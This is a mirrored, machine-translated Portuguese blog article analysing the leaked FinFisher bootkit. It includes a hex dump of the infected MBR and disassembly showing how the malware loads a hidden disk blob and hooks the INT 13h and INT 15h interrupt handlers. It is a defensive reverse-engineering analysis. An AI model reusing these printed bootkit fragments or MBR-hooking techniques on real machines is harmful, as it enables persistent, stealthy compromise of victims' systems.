<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ü§∏üèø üë®üèΩ‚Äç‚öïÔ∏è ‚èÆÔ∏è An√°lise do Butkit FinFisher üçà üßôüèª üñïüèæ</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Boa noite Exatamente uma semana depois, o curso de engenharia reversa come√ßar√° conosco, e hoje queremos compartilhar com voc√™ uma tradu√ß√£o de material...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>An√°lise do Butkit FinFisher</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/otus/blog/441970/">  Boa noite  Exatamente uma semana depois, o curso de <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">engenharia reversa</a> come√ßar√° conosco, e hoje queremos compartilhar com voc√™ uma tradu√ß√£o de material diretamente relacionado a esse curso.  Vamos l√° <br><br>  Recentemente, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">examinamos o</a> kit de inicializa√ß√£o de malware FinFisher publicado pelo <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">WikiLeaks</a> .  A maioria dos componentes da vers√£o do Windows era bastante simples, ent√£o vamos para o driver do modo kernel e o c√≥digo de inicializa√ß√£o. <br><br><img src="https://habrastorage.org/webt/kg/jt/3o/kgjt3ozk7ugr29_-fpj84jwekmw.png"><br><br>  O driver no modo kernel l√™ diretamente os dados brutos do disco r√≠gido ou os grava nele.  Uma vers√£o simplificada do m√©todo usado pelo driver pode ser encontrada <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">neste artigo.</a> <br><a name="habracut"></a><br>  O programa malicioso cria uma c√≥pia do registro mestre de inicializa√ß√£o (abreviado como MBR) e o salva separadamente no disco r√≠gido.  Al√©m disso, o programa grava 0x2A00 bytes de dados no disco r√≠gido infectado.  Eles s√£o copiados posteriormente pelo c√≥digo de inicializa√ß√£o mal-intencionado.  O endere√ßo do primeiro setor que cont√©m esses dados √© codificado no c√≥digo de inicializa√ß√£o.  Para encontrar sua localiza√ß√£o f√≠sica, o malware usa o LBA (Logical Block Addressing). <br>  Na m√°quina de teste, o MBR foi substitu√≠do pelos seguintes dados: <br><br><pre><code class="bash hljs">f9fef780 fa 31 c0 8e c0 8e d8 8e d0 bc <span class="hljs-built_in"><span class="hljs-built_in">fc</span></span> ff fb 88 16 34 .1.............4 f9fef790 7c 68 00 00 68 37 7c cb 18 a7 3f 01 00 00 00 00 |h..h7|...?..... f9fef7a0 15 00 00 00 2e a7 3f 01 00 00 00 00 89 c0 89 c9 ......?......... f9fef7b0 89 d2 31 02 00 00 00 b4 41 bb aa 55 <span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> 13 72 11 ..1.....A..U..r. f9fef7c0 81 fb 55 aa 75 0b f7 c1 01 00 74 05 c6 06 36 7c ..Uu....t...6| f9fef7d0 01 8a 16 34 7c b4 08 <span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> 13 88 c8 24 3f a2 c2 7c ...4|......$?..| f9fef7e0 88 e8 88 cc c0 ec 06 40 a3 c3 7c 30 f6 fe c2 89 .......@..|0.... f9fef7f0 16 c5 7c 66 8b 0e 18 7c 66 8b 16 1c 7c b8 00 01 ..|f...|f...|... f9fef800 2d 20 00 8e c0 66 31 db 66 51 8c c0 05 20 00 8e - ...f1.fQ... .. f9fef810 c0 80 3e 36 7c 01 74 06 e8 62 00 e9 03 00 e8 36 ..&gt;6|.t..b.....6 f9fef820 00 66 59 66 81 c1 01 00 00 00 66 81 d2 00 00 00 .fYf......f..... f9fef830 00 66 ff 0e 20 7c 75 d0 8a 16 34 7c ea 00 10 00 .f.. |u...4|.... f9fef840 00 00 00 00 00 00 00 10 00 01 00 00 00 00 00 00 ................ f9fef850 00 00 00 00 00 00 00 8c c0 a3 <span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> 7c 89 1e cb 7c ...........|...| f9fef860 66 89 0e cf 7c 66 89 16 d3 7c 66 52 66 31 d2 8a f...|f...|fRf1.. f9fef870 16 34 7c be c7 7c b4 42 <span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> 13 66 5a c3 66 52 66 .4|..|.B..fZ.fRf f9fef880 53 66 89 c8 66 31 d2 66 31 db 8a 1e c2 7c 66 f7 Sf..f1.f1....|f. f9fef890 f3 66 42 88 16 c1 7c 66 31 d2 66 31 db 8b 1e c5 .fB...|f1.f1.... f9fef8a0 7c 66 f7 f3 8a 0e c1 7c 88 c5 88 d6 66 5b 8a 16 |f.....|....f[.. f9fef8b0 34 7c b8 01 02 <span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> 13 66 5a c3 00 00 00 00 00 00 4|.....fZ....... f9fef8c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ f9fef8d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ f9fef8e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ f9fef8f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ f9fef900 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ f9fef910 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ f9fef920 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ f9fef930 00 00 00 00 00 00 00 00 65 f7 65 f7 00 00 80 01 ........ee.... f9fef940 01 00 07 fe ff ff 3f 00 00 00 d9 a6 3f 01 00 00 ......?.....?... f9fef950 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ f9fef960 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ f9fef970 00 00 00 00 00 00 00 00 00 00 00 00 00 00 55 aa ..............U.</code> </pre> <br><br>  Uma inspe√ß√£o r√°pida dos dados sugere que o malware alterou o c√≥digo de inicializa√ß√£o, mas as informa√ß√µes da tabela de parti√ß√µes permaneceram intocadas. <br><br>  <b>An√°lise de c√≥digo de inicializa√ß√£o mal-intencionada</b> <br><br>  Vamos considerar com mais detalhes as partes mais interessantes do c√≥digo de inicializa√ß√£o.  Primeiramente, a verifica√ß√£o da instala√ß√£o do Extended Disk Drive (EDD) √© realizada: <br><br><pre> <code class="bash hljs">seg000:0037 B4 41 mov ah, 41h ; <span class="hljs-string"><span class="hljs-string">'A'</span></span> seg000:0039 BB AA 55 mov bx, 55AAh seg000:003C CD 13 int 13h</code> </pre> <br><br>  O malware define um sinalizador que indica se o EDD est√° definido.  O sinalizador controla o m√©todo usado pelo malware para ler dados do disco r√≠gido na mem√≥ria f√≠sica: <br><br><pre> <code class="bash hljs">seg000:004C C6 06 36 7C 01 mov byte ptr ds:if_edd_installed, 1 ;7C36h</code> </pre> <br><br>  Em seguida, o malware obt√©m as configura√ß√µes do disco: <br><br><pre> <code class="bash hljs">seg000:0051 8A 16 34 7C mov dl, ds:7C34h ;drive number, first drive is 0x80 seg000:0055 B4 08 mov ah, 8 seg000:0057 CD 13 int 13h</code> </pre><br><br>  No momento, o programa coletou informa√ß√µes suficientes para copiar um blob malicioso de 0x2A00 bytes do disco r√≠gido para a mem√≥ria f√≠sica.  Um blob de dados √© copiado em um setor de cada vez.  O c√≥digo abaixo √© o loop usado pelo malware para copiar o c√≥digo: <br><br><pre> <code class="bash hljs">seg000:0091 80 3E 36 7C 01 cmp byte ptr ds:if_edd_installed, 1 seg000:0096 74 06 jz short loc_9E seg000:0098 E8 62 00 call read_data_method_no_edd_installed seg000:009B E9 03 00 jmp loc_A1 seg000:009E ; --------------------------------------------------------------------------- seg000:009E seg000:009E loc_9E: seg000:009E E8 36 00 call read_data_method_edd_installed seg000:00A1 seg000:00A1 loc_A1: seg000:00A1 66 59 pop ecx seg000:00A3 66 81 C1 01 00 00 00 add ecx, 1 seg000:00AA 66 81 D2 00 00 00 00 adc edx, 0 seg000:00B1 66 FF 0E 20 7C dec dword ptr ds:7C20h ;0x0015 seg000:00B6 75 D0 jnz short loc_88</code> </pre> <br><br>  A seguir, est√° o c√≥digo da fun√ß√£o usada para copiar dados ao instalar o EDD: <br><br><pre> <code class="bash hljs">BOOT_SECTOR:7CD7 8C C0 mov ax, es BOOT_SECTOR:7CD9 A3 CD 7C mov word_7CCD, ax BOOT_SECTOR:7CDC 89 1E CB 7C mov word_7CCB, bx BOOT_SECTOR:7CE0 66 89 0E CF 7C mov dword_7CCF, ecx BOOT_SECTOR:7CE5 66 89 16 D3 7C mov dword_7CD3, edx BOOT_SECTOR:7CEA 66 52 push edx BOOT_SECTOR:7CEC 66 31 D2 xor edx, edx BOOT_SECTOR:7CEF 8A 16 34 7C mov dl, byte_7C34 BOOT_SECTOR:7CF3 BE C7 7C mov si, 7CC7h BOOT_SECTOR:7CF6 B4 42 mov ah, 42h ; <span class="hljs-string"><span class="hljs-string">'B'</span></span> BOOT_SECTOR:7CF8 CD 13 int 13h ; DISK - IBM/MS Extension - EXTENDED READ (DL - drive, DS:SI - disk address packet)</code> </pre> <br><br>  Neste exemplo, antes de chamar a INT 13h para copiar o primeiro setor de dados maliciosos na mem√≥ria f√≠sica da m√°quina de teste, temos os seguintes argumentos: <br><br><pre> <code class="bash hljs"> 0x0000000000007cc7 &lt;bogus+ 0&gt;: 0x0010 0x0001 0x0000 0x0100 0xa718 0x013f 0x0000 0x0000 +0: 0x10 - packet size +2: 0x1 - number of sectors +4: 0x0000 - offset +6: 0x1000 - segment +8: 0x013fa718 - LBA</code> </pre> <br><br>  Depois que o malware termina de copiar os dados, ele acessa o c√≥digo copiado e continua a execu√ß√£o: <br><br><pre> <code class="bash hljs">seg000:00B8 8A 16 34 7C mov dl, ds:7C34h ;0x0000 seg000:00BC EA 00 10 00 00 jmp far ptr 0:1000h</code> </pre><br><br>  O c√≥digo em 0x1000 √© a parte mais interessante do programa.  Por√©m, antes de continuar a an√°lise, vale lembrar que o kit de inicializa√ß√£o do FinFisher funciona em modo real.  Isso √© diferente do modo protegido.  Uma das diferen√ßas √© que voc√™ precisa calcular os endere√ßos f√≠sicos usando uma combina√ß√£o dos registradores es: di e ds: si. <br>  A f√≥rmula para calcular o endere√ßo f√≠sico √© (segmento * 0x10) + deslocamento.  Por exemplo, se olharmos para o par es: di, es √© o segmento e di √© o deslocamento.  Todos os endere√ßos abaixo s√£o calculados usando esta f√≥rmula. <br>  Agora vamos ver a parte mais interessante do c√≥digo.  Primeiro, o malware calcula o endere√ßo do segmento de onde os dados s√£o copiados (√© a segunda vez que o blob de dados √© copiado): <br><br><pre> <code class="bash hljs">seg000:0024 88 16 1B 00 mov ds:1Bh, dl seg000:0028 BE 13 04 mov si, 413h seg000:002B 26 8B 04 mov ax, es:[si] seg000:002E 66 0F B7 C0 movzx eax, ax seg000:0032 66 C1 E0 0A shl eax, 0Ah seg000:0036 66 2D C2 28 00 00 sub eax, 28C2h ;before the segment address is stored: ;&lt;bochs:148&gt; x /1hw 0x101c ;[bochs]:0x000000000000101c &lt;bogus+ 0&gt;: 0x00000000 seg000:003C 66 A3 1C 00 mov ds:1Ch, eax ;ds = 0x0100, ds:1ch = hex((0x0100* 0x10) + 0x1c) = 0x101c ;after the segment address is stored: ;&lt;bochs:150&gt; x /1hw 0x101c ;[bochs]:0x000000000000101c &lt;bogus+ 0&gt;: 0x0009d33e</code> </pre> <br><br>  Em seguida, o programa define ganchos para os manipuladores INT 13h e INT 15h.  Como voc√™ pode ver no c√≥digo acima, o programa malicioso n√£o fornece novas id√©ias sobre como interceptar manipuladores de interrup√ß√£o de baixo n√≠vel: <br><br><pre> <code class="bash hljs">seg000:0040 66 50 push eax seg000:0042 66 C1 E8 0A shr eax, 0Ah seg000:0046 26 89 04 mov es:[si], ax ;es=0x0000, si = 0x0413 ;before: &lt;bochs:156&gt; x /1hw 0x413 [bochs]: 0x0000000000000413 &lt;bogus+ 0&gt;: 0x0000027f ;after: ;&lt;bochs:158&gt; x /1hw 0x413 [bochs]: 0x0000000000000413 &lt;bogus+ 0&gt;: 0x00000274 seg000:0049 66 58 pop eax seg000:004B seg000:004B loc_4B: seg000:004B seg000:004B 66 C1 E8 04 shr eax, 4 seg000:004F A3 22 00 mov ds:22h, ax ;ax = 0x9d33 ;after: ;&lt;bochs:167&gt; x /1hh 0x1022 [bochs]: 0x0000000000001022 &lt;bogus+ 0&gt;: 0x9d33 seg000:0052 FA cli seg000:0053 loc_53: seg000:0053 8C D8 mov ax, ds seg000:0055 8E C0 mov es, ax seg000:0057 66 B8 20 E8 00 00 mov eax, 0E820h ;get system memory map seg000:005D 66 BA 50 41 4D 53 mov edx, 534D4150h ;<span class="hljs-string"><span class="hljs-string">"SMAP"</span></span> seg000:0063 66 31 DB xor ebx, ebx ;start at the beginning of the map. seg000:0066 66 31 FF xor edi, edi seg000:0069 BF 26 01 mov di, 126h ;es:di buffer that gets the result. ;es = 0x100, di = 0x0126 seg000:006C 26 66 C7 45 14 01 00 00+ mov dword ptr es:[di+14h], 1 seg000:0075 66 B9 18 00 00 00 mov ecx, 18h ;size of the buffer. seg000:007B CD 15 int 15h ;BIOS Memory Services seg000:007D 72 34 jb short loc_B3 seg000:007F 66 3D 50 41 4D 53 cmp eax, 534D4150h ;check <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> <span class="hljs-string"><span class="hljs-string">"SMAP"</span></span> seg000:0085 75 2C jnz short loc_B3 seg000:0087 66 85 DB <span class="hljs-built_in"><span class="hljs-built_in">test</span></span> ebx, ebx seg000:008A 74 27 jz short loc_B3 seg000:008C db 3Eh seg000:008C 3E 66 89 1E F2 02 mov ds:2F2h, ebx ;holds continuation value ;ds = 0x100, physical address 0x12f2 seg000:0092 66 31 C0 xor eax, eax seg000:0095 8E C0 mov es, ax seg000:0097 assume es:nothing seg000:0097 26 66 A1 54 00 mov eax, dword ptr es:int_15_h ;IVTABLE:0054 seg000:009C db 3Eh ;debug001:12EE 00 00 00 00 dword_12EE dd 0 ;debug001:12F2 01 00 00 00 dword_12F2 dd 1 seg000:009C 3E 66 A3 EE 02 mov ds:2EEh, eax ;debug001:12EE 59 F8 00 F0 dword_12EE dd 0F000F859h ;debug001:12F2 01 00 00 00 dword_12F2 dd 1 seg000:00A1 A1 22 00 mov ax, ds:22h ;segment_hook ;previously calculated value 0x9d33 seg000:00A4 66 C1 E0 10 shl eax, 10h seg000:00A8 66 05 42 01 00 00 add eax, 142h ;before hook is installed: IVTABLE:004C FE E3 00 F0 dword_4C dd 0F000E3FEh IVTABLE:004C IVTABLE:0050 39 E7 word_50 dw 0E739h IVTABLE:0052 00 F0 word_52 dw 0F000h IVTABLE:0054 59 F8 00 F0 dword_54 dd 0F000F859h IVTABLE:0054 seg000:00AE 26 66 A3 54 00 mov dword ptr es:int_15_h, eax ;hooks INT15h ;&lt;bochs:206&gt; x /1hw 0x54 [bochs]: 0x0000000000000054 &lt;bogus+ 0&gt;: 0x9d330142 ;IVTABLE:0054 42 01 word_54 dw 142h ;offset ;IVTABLE:0056 33 9D dw 9D33h ;segment seg000:00B3 loc_B3: seg000:00B3 66 31 C0 xor eax, eax seg000:00B6 8E C0 mov es, ax seg000:00B8 26 66 A1 4C 00 mov eax, dword ptr es:int_13_h ;before: ;debug001:11D4 00 00 00 00 int_13_original dd 0 ;after: ;debug001:11D4 FE E3 00 F0 int_13_original dd 0F000E3FEh seg000:00BD db 3Eh seg000:00BD 3E 66 A3 D4 01 mov ds:1D4h, eax ;debug001:11CC FE E3 00 F0 int_13_original_1 dd 0F000E3FEh seg000:00C2 3E 66 A3 CC 01 mov ds:1CCh, eax seg000:00C7 A1 22 00 mov ax, ds:22h ;0x9d33 seg000:00CA 66 C1 E0 10 shl eax, 10h seg000:00CE db 3Eh seg000:00CE 3E 66 A3 51 02 mov ds:251h, eax ;before: ;debug001:1251 00 00 00 00 hook_segment dd 0 ;after: ;debug001:1251 00 00 33 9D hook_segment dd 9D330000h seg000:00D3 66 05 12 01 00 00 add eax, 112h seg000:00D9 26 66 A3 4C 00 mov dword ptr es:loc_4B+1, eax ;hooks INT13h ;es = 0x00 eax = 0x112 ;IVT after both INT 13h and INT 15h hooks are installed: IVTABLE:004C 12 01 int_13_h dw 112h ; offset IVTABLE:004E 33 9D dw 9D33h ; segment IVTABLE:0050 39 E7 word_50 dw 0E739h IVTABLE:0052 00 F0 word_52 dw 0F000h IVTABLE:0054 42 01 int_15_h dw 142h ; offset IVTABLE:0056 33 9D dw 9D33h ; segment</code> </pre> <br><br>  Agora os ganchos est√£o definidos para INT 13h e INT 15h, mas o c√≥digo para fun√ß√µes que conectam INTs ainda n√£o foi copiado para o segmento computado.  Obviamente, o pr√≥ximo passo √© copiar o c√≥digo para os manipuladores interceptados: <br><br><pre> <code class="bash hljs">seg000:00DE A1 22 00 mov ax, ds:22h seg000:00E1 8E C0 mov es, ax seg000:00E3 31 FF xor di, di seg000:00E5 B9 C2 28 mov cx, 28C2h seg000:00E8 FC cld seg000:00E9 BE 3E 01 mov si, 13Eh seg000:00EC F3 A4 rep movsb ;si = 0x013e - <span class="hljs-built_in"><span class="hljs-built_in">source</span></span> of the data to be copied. ;di = 0x0000 - destination ;cx = 0x28c2 - number of bytes to be copied. ;ds = 0x0100, es = 0x9d33 ;the actual physical addresses of the <span class="hljs-built_in"><span class="hljs-built_in">source</span></span> is ds:[si] = ;hex((0x0100 * 0x10) + 0x13e) = 0x113e ;the physical address of the destination is es:[di] = ;hex((0x9dd3 * 0x10) + 0x0000) = 0x9dd30 ;copies all the data copied <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> the first stage except <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> the first 0x13e bytes. ;hex(0x2a00-0x28c2) = 0x13e</code> </pre> <br><br>  Agora, o malware est√° pronto para recuperar o controle do MBR original, mas, primeiro, ele precisa restaurar o MBR para 0x7C00 (o setor em que a c√≥pia do MBR original est√° localizada √© armazenado em outro local no disco r√≠gido) e depois transferir a execu√ß√£o do MBR original. <br><br><pre> <code class="bash hljs">seg000:00EE FB sti seg000:00EF 66 8B 0E 13 00 mov ecx, ds:13h seg000:00F4 66 8B 16 17 00 mov edx, ds:17h seg000:00F9 66 89 0E 1E 01 mov ds:11Eh, ecx seg000:00FE 66 89 16 22 01 mov ds:122h, edx seg000:0103 BE 16 01 mov si, 116h ;buffer ;ds = 0x0100, address 0x1116 seg000:0106 BB AA 55 mov bx, 55AAh seg000:0109 8A 16 1B 00 mov dl, ds:1Bh ;drive number here 0x80 seg000:010D B4 42 mov ah, 42h ; <span class="hljs-string"><span class="hljs-string">'B'</span></span> seg000:010F CD 13 int 13h ;DISK - IBM/MS Extension - EXTENDED READ (DL - drive, DS:SI - disk address packet) ;INT 13h is hooked now ;debug003:0112 EA 00 00 33 9D jmp far ptr loc_9D330 ;&lt;bochs:267&gt; x /10hh 0x1116 [bochs]: 0x0000000000001116 &lt;bogus+ 0&gt;: 0x0010 0x0001 0x7c00 0x0000 0xa72d 0x013f 0x 0000 0x0000 0x0000000000001126 &lt;bogus+ 16&gt;: 0x0000 0x0000 size of the packet 0x0010 number of blocks to transfer = 0x0001 destination 0x7c00 LBA: 0x013fa7d2 ;Jumps to the original MBR here: seg000:0111 EA 00 7C 00 00 jmp far ptr 0:7C00h</code> </pre> <br><br>  <b>O que aprendemos com o kit de inicializa√ß√£o do FinFisher</b> <br><br>  Este exemplo do kit de inicializa√ß√£o do FinFisher n√£o oferece novas t√©cnicas ou melhorias em rela√ß√£o a outros kits de inicializa√ß√£o.  Os criadores de malware decidiram definir ganchos para os manipuladores INT 13h e INT 15h antes que o c√≥digo desses manipuladores seja copiado na mem√≥ria;  o que poderia ser desastroso.  Por exemplo, se o c√≥digo das fun√ß√µes do manipulador interceptado n√£o puder ser copiado, poder√° ocorrer uma falha no sistema. <br><br>  Tradicionalmente, aguardamos seus coment√°rios e convidamos todos para um <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">dia aberto</a> , que ser√° realizado amanh√£. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/pt441970/">https://habr.com/ru/post/pt441970/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt441956/index.html">Tratamento de erro unificado (op√ß√£o C ++ para microcontroladores)</a></li>
<li><a href="../pt441962/index.html">√çndices no PostgreSQL - 1</a></li>
<li><a href="../pt441964/index.html">Dicas e truques do Kubernetes: movendo recursos de cluster para o Helm 2</a></li>
<li><a href="../pt441966/index.html">Kit de inicia√ß√£o para testes de seguran√ßa na Web</a></li>
<li><a href="../pt441968/index.html">Desenvolvimento de um novo ramo de produtos: como se livrar do impratic√°vel e se manter √∫til</a></li>
<li><a href="../pt441972/index.html">Invidious - front-end alternativo do YouTube</a></li>
<li><a href="../pt441974/index.html">O caminho do historiador de RH para programadores Java: um pouco de sorte e perseveran√ßa</a></li>
<li><a href="../pt441976/index.html">Com voc√™ FizTech.Science: estamos procurando par√¢metros ocultos e mergulhando no maravilhoso mundo qu√¢ntico</a></li>
<li><a href="../pt441978/index.html">Teste funcional das habilidades do Yandex Alice no Node.js</a></li>
<li><a href="../pt441980/index.html">Os cientistas identificaram as falhas da interface do Windows Update, que √© parcialmente projetada para "usu√°rios est√∫pidos"</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>